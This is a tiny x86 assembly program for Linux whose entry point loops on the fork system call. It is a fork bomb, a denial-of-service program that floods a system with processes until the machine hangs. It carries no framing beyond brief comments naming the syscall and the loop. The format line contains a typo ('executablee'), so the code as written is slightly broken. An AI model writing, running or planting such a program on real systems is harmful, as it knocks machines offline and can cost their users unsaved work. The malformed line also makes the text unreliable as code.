format ELF executablee
entry start
start:
    push 0x2  ; Linux fork system call
    pop eax
    int 0x80    ; Call to the kernel
    jmp start   ; Loop back to the start